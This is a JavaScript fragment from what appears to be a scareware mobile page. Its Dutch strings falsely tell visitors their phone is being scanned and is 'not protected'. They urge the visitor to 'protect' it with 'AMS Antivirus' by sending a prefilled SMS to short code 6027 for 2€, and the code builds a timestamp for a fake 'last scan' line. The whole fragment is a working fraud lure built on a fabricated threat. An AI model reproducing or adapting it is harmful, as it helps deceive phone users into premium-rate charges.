			//parámetros mensaje
			var Scan ="Het controleren van de mobiele telefoon...";
			var ShortCode = "6027";
            var Alias ="TOOLS";
            var texto_sms = "Bevestig%20dat%20u%20wilt%20uw%20mobiele%20beschermen.%0A%0AKlik%20op%20Stuur.";
            var amenazas = "Je mobiele <span>is niet beschermd!</span>";
			var escaneo = "Laatste scan:";
			var proteja = "<strong>Bescherm uw mobiele telefoon met AMS Antivirus</strong>";
			var escanea = "BESCHERMEN!";
			var tyc = "Met AMS Antivirus kunt u uw apparaat te scannen op zoek naar verdachte toepassingen. Antivirus AMS zal herziening van de toepassingen geïnstalleerd en de toestemmingen gegeven om te waarschuwen voor de risico's.";
			var price ="<strong>Price: 2€ Support: support@medianetpay.com</strong>";
			var bill = '';

			var today = new Date();
			var dd = today.getDate();
			var mm = today.getMonth()+1;
			var yyyy = today.getFullYear();
			var hh = today.getHours();
			var mimi = today.getMinutes();
				if(dd<10) {
				dd='0'+dd
							} 
				if(mm<10) {
				mm='0'+mm
							} 
				if(hh<10) {
				hh='0'+hh
							} 
				if(mimi<10) {
				mimi='0'+mimi
							} 
							
today = dd+'/'+mm+'/'+yyyy+ '  ' +hh+ ':' +mimi;